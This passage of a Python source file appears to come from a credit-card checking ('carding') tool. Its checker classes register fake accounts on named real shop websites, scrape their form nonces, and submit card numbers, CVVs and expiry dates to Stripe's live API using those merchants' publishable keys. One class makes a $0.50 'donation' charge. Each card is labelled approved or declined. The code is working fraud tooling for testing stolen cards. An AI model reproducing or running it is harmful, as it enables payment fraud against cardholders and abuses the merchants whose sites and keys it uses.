            r'createAndConfirmSetupIntentNonce\s*=\s*["\']([a-f0-9]{10})["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    def get_setup_nonce(self, url="https://lolaandveranda.com/my-account/add-payment-method/"):
        """Get setup nonce with retry logic"""
        for attempt in range(self.max_retries):
            try:
                response = self.session.get(url, timeout=30, verify=False)
                response.raise_for_status()
                
                nonce = self.extract_nonce_multiple_methods(response.text)
                if nonce:
                    return nonce
                
                print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {attempt + 1}/{self.max_retries}: 𝗡𝗼𝗻𝗰𝗲 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
                time.sleep(self.retry_delay)
                
            except Exception as e:
                print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {attempt + 1}/{self.max_retries} 𝗳𝗮𝗶𝗹𝗲𝗱: {str(e)}")
                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay)
                    self.session = requests.Session()
                    self.session.verify = False
                    self.session.headers.update(self.base_headers)
                else:
                    raise e
        
        return None
    
    def setup_account_and_nonce_with_retries(self):
        """Setup account and extract nonce with automatic retries"""
        for retry_count in range(self.max_retries):
            try:
                print(f"𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝘂𝗽 𝗮𝗰𝗰𝗼𝘂𝗻𝘁 (𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {retry_count + 1}/{self.max_retries})")
                
                random_id = random.randint(1000, 9999)
                email = f"david{random_id}@gmail.com"
                password = f"o0P7u$hm4a2jMet{random_id}"
                
                response = self.session.get(
                    f"{self.base_url}/my-account/", 
                    timeout=30, 
                    verify=False
                )
                response.raise_for_status()
                
                nonce = self.extract_register_nonce(response.text)
                wp_referer = self.extract_wp_referer(response.text)
                
                if not nonce:
                    print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {retry_count + 1}: 𝗡𝗼 𝗿𝗲𝗴𝗶𝘀𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝗻𝗼𝗻𝗰𝗲 𝗳𝗼𝘂𝗻𝗱")
                    continue
                
                registration_data = {
                    'email': email,
                    'password': password,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': 'https://lolaandveranda.com/my-account/',
                    'wc_order_attribution_session_start_time': '2025-10-21 15:16:55',
                    'wc_order_attribution_session_pages': '4',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                    'woocommerce-register-nonce': nonce,
                    '_wp_http_referer': wp_referer,
                    'register': 'Register',
                }
                
                registration_headers = {
                    'authority': 'lolaandveranda.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://lolaandveranda.com',
                    'referer': 'https://lolaandveranda.com/my-account/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                }
                
                response = self.session.post(
                    f"{self.base_url}/my-account/",
                    data=registration_data,
                    headers=registration_headers,
                    timeout=30,
                    verify=False,
                    allow_redirects=True
                )
                response.raise_for_status()
                
                if self.is_logged_in(response.text):
                    print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {retry_count + 1}: 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹")
                    
                    for setup_retry in range(3):
                        setup_nonce = self.get_setup_nonce()
                        if setup_nonce:
                            self.setup_nonce = setup_nonce
                            self.session_created = True
                            print(f"𝗦𝗲𝘁𝘂𝗽 𝗻𝗼𝗻𝗰𝗲 𝗼𝗯𝘁𝗮𝗶𝗻𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆")
                            return True
                        else:
                            print(f"𝗦𝗲𝘁𝘂𝗽 𝗻𝗼𝗻𝗰𝗲 𝗲𝘅𝘁𝗿𝗮𝗰𝘁𝗶𝗼𝗻 𝗮𝘁𝘁𝗲𝗺𝗽𝘁 {setup_retry + 1}/𝟯 𝗳𝗮𝗶𝗹𝗲𝗱")
                            time.sleep(1)
                    
                    print("𝗦𝗲𝘁𝘂𝗽 𝗻𝗼𝗻𝗰𝗲 𝗲𝘅𝘁𝗿𝗮𝗰𝘁𝗶𝗼𝗻 𝗳𝗮𝗶𝗹𝗲𝗱 𝗮𝗳𝘁𝗲𝗿 𝗿𝗲𝘁𝗿𝗶𝗲𝘀")
                    continue
                else:
                    print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {retry_count + 1}: 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝗳𝗮𝗶𝗹𝗲𝗱 - 𝗻𝗼𝘁 𝗹𝗼𝗴𝗴𝗲𝗱 𝗶𝗻")
                    
            except Exception as e:
                print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {retry_count + 1} 𝗳𝗮𝗶𝗹𝗲𝗱 𝘄𝗶𝘁𝗵 𝗲𝗿𝗿𝗼𝗿: {str(e)}")
            
            if retry_count < self.max_retries - 1:
                print(f"𝗥𝗲𝘁𝗿𝘆𝗶𝗻𝗴 𝗶𝗻 {self.retry_delay} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀...")
                time.sleep(self.retry_delay)
                
                self.session = requests.Session()
                self.session.verify = False
                self.session.headers.update(self.base_headers)
        
        print("𝗔𝗹𝗹 𝘀𝗲𝘁𝘂𝗽 𝗮𝘁𝘁𝗲𝗺𝗽𝘁𝘀 𝗳𝗮𝗶𝗹𝗲𝗱")
        return False
    
    def process_card(self, card_line: str) -> Optional[Dict]:
        """Process a single card"""
        card_data = self.parse_card(card_line)
        if not card_data:
            return None
        
        if not self.session_created or self.setup_nonce is None:
            success = self.setup_account_and_nonce_with_retries()
            if not success:
                return {
                    'card': card_data['original'],
                    'status': '𝗘𝗥𝗥𝗢𝗥',
                    'emoji': '❌',
                    'status_message': '𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝘁𝘂𝗽 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗮𝗳𝘁𝗲𝗿 𝗿𝗲𝘁𝗿𝗶𝗲𝘀',
                    'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻',
                    'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻',
                    'bin_info': {'scheme': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'type': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'},
                    'vbv_status': {'status': '⚠️', 'description': 'Session setup failed'},
                    'response': '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝘀𝗲𝘁𝘂𝗽 𝗳𝗮𝗶𝗹𝗲𝗱 𝗮𝗳𝘁𝗲𝗿 𝗿𝗲𝘁𝗿𝗶𝗲𝘀'
                }
        
        bin_info = self.get_bin_info(card_data['bin'])
        vbv_status = self.get_vbv_status(card_data)
        
        for attempt in range(3):
            try:
                stripe_headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                }
                
                stripe_data = (
                    f'type=card&'
                    f'card[number]={card_data["number"]}&'
                    f'card[cvc]={card_data["cvv"]}&'
                    f'card[exp_year]={card_data["short_year"]}&'
                    f'card[exp_month]={card_data["month"]}&'
                    f'allow_redisplay=unspecified&'
                    f'billing_details[address][postal_code]=10080&'
                    f'billing_details[address][country]=US&'
                    f'payment_user_agent=stripe.js%2F4ee0ef76c3%3B+stripe-js-v3%2F4ee0ef76c3%3B+payment-element%3B+deferred-intent&'
                    f'referrer=https%3A%2F%2Flolaandveranda.com&'
                    f'time_on_page=55728&'
                    f'client_attribution_metadata[client_session_id]=1d14ad14-50c0-415f-b1cb-05d82bf92a4b&'
                    f'client_attribution_metadata[merchant_integration_source]=elements&'
                    f'client_attribution_metadata[merchant_integration_subtype]=payment-element&'
                    f'client_attribution_metadata[merchant_integration_version]=2021&'
                    f'client_attribution_metadata[payment_intent_creation_flow]=deferred&'
                    f'client_attribution_metadata[payment_method_selection_flow]=merchant_specified&'
                    f'client_attribution_metadata[elements_session_config_id]=879faec2-7ed5-4ee1-a1f3-7b10be480c9d&'
                    f'guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&'
                    f'muid=6ea35cc5-3766-416d-ba08-434b61fb526d436592&'
                    f'sid=4373bd82-91e4-4fb0-83ee-0ba0f724bcfdddf102&'
                    f'key=pk_live_51KvfxOAXdQYg3Kve5Dflq504Hy68DHhZfeB6eBPir5aY01s18bWHxpVRKRMRYy7kgoKkmCuNgmu7mDiL6WqIVsH7003wq0Cyi3&'
                    f'_stripe_version=2024-06-20'
                )
                
                payment_response = requests.post(
                    'https://api.stripe.com/v1/payment_methods', 
                    headers=stripe_headers, 
                    data=stripe_data,
                    verify=False,
                    timeout=30
                )
                
                payment_response_text = payment_response.text
                
                if payment_response.status_code != 200:
                    status, emoji, status_msg = self.categorize_response(payment_response_text, payment_response_text)
                    return {
                        'card': card_data['original'],
                        'status': status,
                        'emoji': emoji,
                        'status_message': status_msg,
                        'bank': bin_info['bank'],
                        'country': bin_info['country'],
                        'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                        'vbv_status': vbv_status,
                        'response': payment_response_text
                    }
                
                payment_method_data = payment_response.json()
                
                if 'error' in payment_method_data:
                    status, emoji, status_msg = self.categorize_response(str(payment_method_data), str(payment_method_data))
                    return {
                        'card': card_data['original'],
                        'status': status,
                        'emoji': emoji,
                        'status_message': status_msg,
                        'bank': bin_info['bank'],
                        'country': bin_info['country'],
                        'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                        'vbv_status': vbv_status,
                        'response': str(payment_method_data)
                    }
                
                payment_method_id = payment_method_data.get("id")
                if not payment_method_id:
                    if attempt < 2:
                        continue
                    return {
                        'card': card_data['original'],
                        'status': '𝗘𝗥𝗥𝗢𝗥',
                        'emoji': '❌',
                        'status_message': '𝗡𝗼 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱 𝗜𝗗 𝗮𝗳𝘁𝗲𝗿 𝗿𝗲𝘁𝗿𝗶𝗲𝘀',
                        'bank': bin_info['bank'],
                        'country': bin_info['country'],
                        'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                        'vbv_status': vbv_status,
                        'response': '𝗡𝗼 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱 𝗜𝗗 𝗿𝗲𝘁𝘂𝗿𝗻𝗲𝗱 𝗮𝗳𝘁𝗲𝗿 𝗿𝗲𝘁𝗿𝗶𝗲𝘀'
                    }
                
                time.sleep(8)
                
                setup_headers = {
                    'authority': 'lolaandveranda.com',
                    'accept': '*/*',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://lolaandveranda.com',
                    'referer': 'https://lolaandveranda.com/my-account/add-payment-method/',
                    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                setup_data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': payment_method_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': self.setup_nonce,
                }
                
                setup_response = self.session.post(
                    'https://lolaandveranda.com/wp-admin/admin-ajax.php', 
                    headers=setup_headers, 
                    data=setup_data,
                    verify=False,
                    timeout=30
                )
                
                setup_response_text = setup_response.text
                
                if setup_response.status_code == 200:
                    try:
                        result = setup_response.json()
                        
                        if result.get('success'):
                            if result.get('data', {}).get('status') == 'succeeded':
                                status, emoji, status_msg = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗", "🔥", "𝗖𝗮𝗿𝗱 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆"
                            else:
                                error_data = result.get('data', {})
                                if isinstance(error_data, dict) and 'error' in error_data:
                                    error_msg = error_data['error'].get('message', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲')
                                else:
                                    error_msg = str(error_data) if error_data else '𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗲'
                                status, emoji, status_msg = self.categorize_response(error_msg, payment_response_text)
                        else:
                            error_data = result.get('data', {})
                            if isinstance(error_data, dict) and 'error' in error_data:
                                error_msg = error_data['error'].get('message', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗲𝗿𝗿𝗼𝗿')
                            else:
                                error_msg = str(error_data) if error_data else '𝗨𝗻𝗸𝗻𝗼𝘄𝗻 𝗲𝗿𝗿𝗼𝗿'
                            status, emoji, status_msg = self.categorize_response(error_msg, payment_response_text)
                    except json.JSONDecodeError:
                        status, emoji, status_msg = self.categorize_response(setup_response_text, payment_response_text)
                else:
                    error_msg = f"𝗛𝗧𝗧𝗣 𝗘𝗿𝗿𝗼𝗿: {setup_response.status_code}"
                    status, emoji, status_msg = self.categorize_response(error_msg, payment_response_text)
                
                return {
                    'card': card_data['original'],
                    'status': status,
                    'emoji': emoji,
                    'status_message': status_msg,
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': setup_response_text
                }
                
            except Exception as e:
                if attempt < 2:
                    print(f"𝗖𝗮𝗿𝗱 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗮𝘁𝘁𝗲𝗺𝗽𝘁 {attempt + 1} 𝗳𝗮𝗶𝗹𝗲𝗱: {str(e)}")
                    time.sleep(2)
                    continue
                
                error_msg = f"𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗘𝗿𝗿𝗼𝗿 𝗮𝗳𝘁𝗲𝗿 𝗿𝗲𝘁𝗿𝗶𝗲𝘀: {str(e)}"
                return {
                    'card': card_data['original'],
                    'status': '𝗘𝗥𝗥𝗢𝗿',
                    'emoji': '❌',
                    'status_message': error_msg,
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': str(e)
                }

class StripeCharge50Checker(BaseCCChecker):
    """Stripe Charge $0.50 Checker"""
    def __init__(self):
        super().__init__()
        self.fluentform_nonce = None
        self.session_created = False
        
    def extract_fluentform_nonce(self, html_content):
        """Extract fluentform nonce from HTML"""
        patterns = [
            r'name="_fluentform_\d+_fluentformnonce" value="([^"]+)"',
            r'_fluentformnonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
            r'fluentformnonce["\']?\s*:\s*["\']([a-f0-9]+)["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        return None
    
    def get_fluentform_nonce(self):
        """Get fluentform nonce from registry page"""
        try:
            headers = {
                **self.base_headers,
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'upgrade-insecure-requests': '1',
            }
            
            response = self.session.get(
                'https://allcoughedup.com/registry/',
                headers=headers,
                timeout=30,
                verify=False
            )
            
            if response.status_code != 200:
                return None
            
            nonce = self.extract_fluentform_nonce(response.text)
            return nonce
                
        except Exception as e:
            return None
    
    def setup_session(self):
        """Setup session and extract nonce"""
        for attempt in range(3):
            try:
                print(f"𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝘂𝗽 $𝟬.𝟱𝟬 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 (𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {attempt + 1}/𝟯)")
                
                nonce = self.get_fluentform_nonce()
                
                if nonce:
                    self.fluentform_nonce = nonce
                    self.session_created = True
                    return True
                else:
                    print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {attempt + 1}: 𝗡𝗼 𝗻𝗼𝗻𝗰𝗲 𝗳𝗼𝘂𝗻𝗱")
                    time.sleep(2)
                    
            except Exception as e:
                print(f"𝗔𝘁𝘁𝗲𝗺𝗽𝘁 {attempt + 1} 𝗳𝗮𝗶𝗹𝗲𝗱 𝘄𝗶𝘁𝗵 𝗲𝗿𝗿𝗼𝗿: {str(e)}")
                time.sleep(2)
        
        return False
    
    def generate_random_ids(self):
        """Generate random IDs for Stripe requests"""
        chars = 'abcdef0123456789'
        
        guid = ''.join(random.choices(chars, k=8)) + '-' + \
               ''.join(random.choices(chars, k=4)) + '-' + \
               ''.join(random.choices(chars, k=4)) + '-' + \
               ''.join(random.choices(chars, k=4)) + '-' + \
               ''.join(random.choices(chars, k=12)) + 'b9f9c3'
        
        muid = ''.join(random.choices(chars, k=8)) + '-' + \
               ''.join(random.choices(chars, k=4)) + '-' + \
               ''.join(random.choices(chars, k=4)) + '-' + \
               ''.join(random.choices(chars, k=4)) + '-' + \
               ''.join(random.choices(chars, k=12)) + 'd64f94'
        
        sid = ''.join(random.choices(chars, k=8)) + '-' + \
              ''.join(random.choices(chars, k=4)) + '-' + \
              ''.join(random.choices(chars, k=4)) + '-' + \
              ''.join(random.choices(chars, k=4)) + '-' + \
              ''.join(random.choices(chars, k=12)) + 'e8bdd5'
        
        return guid, muid, sid
    
    def process_card(self, card_line: str) -> Optional[Dict]:
        """Process a single card with $0.50 charge"""
        card_data = self.parse_card(card_line)
        if not card_data:
            return None
        
        # Always setup session for each card to avoid issues
        success = self.setup_session()
        if not success:
            return {
                'card': card_data['original'],
                'status': '𝗘𝗥𝗥𝗢𝗥',
                'emoji': '❌',
                'status_message': '𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝘁𝘂𝗽 𝘀𝗲𝘀𝘀𝗶𝗼𝗻',
                'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻',
                'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻',
                'bin_info': {'scheme': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'type': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'},
                'vbv_status': {'status': '⚠️', 'description': 'Session setup failed'},
                'response': '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝘀𝗲𝘁𝘂𝗽 𝗳𝗮𝗶𝗹𝗲𝗱'
            }
        
        bin_info = self.get_bin_info(card_data['bin'])
        vbv_status = self.get_vbv_status(card_data)
        
        try:
            guid, muid, sid = self.generate_random_ids()
            
            stripe_headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            stripe_data = (
                f'type=card&'
                f'card[number]={card_data["number"]}&'
                f'card[cvc]={card_data["cvv"]}&'
                f'card[exp_month]={card_data["month"]}&'
                f'card[exp_year]={card_data["short_year"]}&'
                f'guid={guid}&'
                f'muid={muid}&'
                f'sid={sid}&'
                f'payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&'
                f'referrer=https%3A%2F%2Fallcoughedup.com&'
                f'time_on_page=34157&'
                f'client_attribution_metadata[client_session_id]=315febde-4be6-4345-923b-f62674ef4e18&'
                f'client_attribution_metadata[merchant_integration_source]=elements&'
                f'client_attribution_metadata[merchant_integration_subtype]=card-element&'
                f'client_attribution_metadata[merchant_integration_version]=2017&'
                f'key=pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
            )
            
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=stripe_headers, 
                data=stripe_data,
                verify=False,
                timeout=30
            )
            
            payment_response_text = response.text
            
            if response.status_code != 200:
                status, emoji, status_msg = self.categorize_response(payment_response_text, payment_response_text)
                return {
                    'card': card_data['original'],
                    'status': status,
                    'emoji': emoji,
                    'status_message': status_msg,
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': payment_response_text
                }
            
            payment_method_data = response.json()
            
            if 'error' in payment_method_data:
                status, emoji, status_msg = self.categorize_response(str(payment_method_data), str(payment_method_data))
                return {
                    'card': card_data['original'],
                    'status': status,
                    'emoji': emoji,
                    'status_message': status_msg,
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': str(payment_method_data)
                }
            
            payment_method_id = payment_method_data.get("id")
            if not payment_method_id:
                return {
                    'card': card_data['original'],
                    'status': '𝗘𝗥𝗥𝗢𝗥',
                    'emoji': '❌',
                    'status_message': '𝗡𝗼 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱 𝗜𝗗 𝗿𝗲𝘁𝘂𝗿𝗻𝗲𝗱',
                    'bank': bin_info['bank'],
                    'country': bin_info['country'],
                    'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                    'vbv_status': vbv_status,
                    'response': '𝗡𝗼 𝗽𝗮𝘆𝗺𝗲𝗻𝘁 𝗺𝗲𝘁𝗵𝗼𝗱 𝗜𝗗 𝗿𝗲𝘁𝘂𝗿𝗻𝗲𝗱'
                }
            
            time.sleep(2)
            
            form_headers = {
                'authority': 'allcoughedup.com',
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://allcoughedup.com',
                'referer': 'https://allcoughedup.com/registry/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            params = {
                't': str(int(time.time() * 1000)),
            }
            
            random_id = random.randint(1000, 9999)
            email = f"user{random_id}@gmail.com"
            first_name = random.choice(['David', 'John', 'Michael', 'Robert', 'William'])
            last_name = random.choice(['Smith', 'Johnson', 'Williams', 'Brown', 'Jones'])
            
            form_data = {
                'data': (
                    f'__fluent_form_embded_post_id=3612&'
                    f'_fluentform_4_fluentformnonce={self.fluentform_nonce}&'
                    f'_wp_http_referer=%2Fregistry%2F&'
                    f'names%5Bfirst_name%5D={first_name}+{last_name}&'
                    f'email={email}&'
                    f'custom-payment-amount=0.50&'
                    f'description=Donation&'
                    f'payment_method=stripe&'
                    f'__stripe_payment_method_id={payment_method_id}'
                ),
                'action': 'fluentform_submit',
                'form_id': '4',
            }
            
            response = self.session.post(
                'https://allcoughedup.com/wp-admin/admin-ajax.php',
                params=params,
                headers=form_headers,
                data=form_data,
                verify=False,
                timeout=30
            )
            
            form_response_text = response.text
            
            status, emoji, status_msg = self.categorize_response(form_response_text, payment_response_text)
            
            return {
                'card': card_data['original'],
                'status': status,
                'emoji': emoji,
                'status_message': status_msg,
                'bank': bin_info['bank'],
                'country': bin_info['country'],
                'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                'vbv_status': vbv_status,
                'response': form_response_text
            }
            
        except Exception as e:
            error_msg = f"𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗘𝗿𝗿𝗼𝗿: {str(e)}"
            return {
                'card': card_data['original'],
                'status': '𝗘𝗥𝗥𝗢𝗥',
                'emoji': '❌',
                'status_message': error_msg,
                'bank': bin_info['bank'],
                'country': bin_info['country'],
                'bin_info': {'scheme': bin_info.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'), 'type': bin_info.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')},
                'vbv_status': vbv_status,
                'response': str(e)
            }
            
class StripeChargeChecker(BaseCCChecker):
    """Stripe Charge $1 Checker"""
    def __init__(self):
        super().__init__()
        self.token_cache = {}
        self.last_token_refresh = 0
    
    def decode_html_entities(self, text: str) -> str:
        try:
            text = html.unescape(text)
            replacements = {
                '&#x2B;': '+', '&#x2F;': '/', '&#x3D;': '=', '&#x20;': ' ',
                '&#x24;': '$', '&#x27;': "'", '&#x3A;': ':', '&#x3F;': '?',
                '&#x26;': '&', '&#x23;': '#', '&amp;': '&', '&lt;': '<',
                '&gt;': '>', '&quot;': '"', '&#39;': "'", '&#x22;': '"',
            }
            for entity, replacement in replacements.items():
                text = text.replace(entity, replacement)
            text = urllib.parse.unquote(text)
            return text
        except:
            return text

    def extract_json_from_html(self, html_content: str) -> Optional[Dict]:
        try:
            patterns = [
                r'<div id="_bw_config"[^>]*>(.*?)</div>',
                r'window\.bwConfig\s*=\s*({.*?});',
                r'var bwConfig\s*=\s*({.*?});',
                r'<script[^>]*id="_bw_config"[^>]*>(.*?)</script>'
            ]
            
            for pattern in patterns:
                config_match = re.search(pattern, html_content, re.DOTALL)
                if config_match:
                    config_text = config_match.group(1).strip()
                    config_text = self.decode_html_entities(config_text)
                    config_text = re.sub(r'<!--.*?-->', '', config_text, flags=re.DOTALL)
                    config_text = re.sub(r'<script.*?</script>', '', config_text, flags=re.DOTALL)
                    
